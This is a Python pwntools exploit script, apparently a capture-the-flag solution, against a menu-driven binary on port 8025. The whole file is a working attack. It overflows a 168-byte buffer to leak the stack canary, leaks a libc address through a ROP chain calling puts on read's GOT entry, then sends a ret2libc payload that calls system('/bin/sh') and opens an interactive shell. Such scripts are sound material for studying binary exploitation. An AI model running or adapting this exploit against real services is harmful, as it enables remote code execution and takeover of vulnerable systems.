from pwn import *

#context.log_level='DEBUG'

local = 1
if local:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	r = remote("localhost",8025)
	pause()
else:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	r = remote("",8025)
	pause()
	

prdi = p64(0x00400ea3) 
puts = p64(0x4008d0)
read_got = p64(0x0000000000602030)
main = p64(0x0000000000400a96)

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")
r.send("A"*168+"\x01")

r.recvuntil(">>")
r.sendline("2")
r.recvuntil("A"*168)
canary = u64(r.recvline()[0:8])-1

log.info("Canary:"+hex(canary))

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")

payload = "A"*168
payload += p64(canary)
payload += "B"*4
payload += "B"*4
payload += prdi
payload += read_got
payload += puts
payload += main

r.send(payload)

r.recvuntil(">>")
r.sendline("3")
r.recvline()

libc.address = int("0x"+hex(u64("\x00"+r.recvline()[0:8]))[3:15],16)-libc.symbols['read']
system = libc.symbols['system']
binsh = libc.address+0x18cd17

log.info("Libc:"+hex(libc.address))
log.info("System:"+hex(system))
log.info("Binsh:"+hex(binsh))

payload2 = "A"*168
payload2 += p64(canary)
payload2 += "B"*8
payload2 += prdi
payload2 += p64(binsh)
payload2 += p64(system)


r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>")
r.sendline(payload2)

r.recvuntil(">>")
r.sendline("3")

r.interactive()
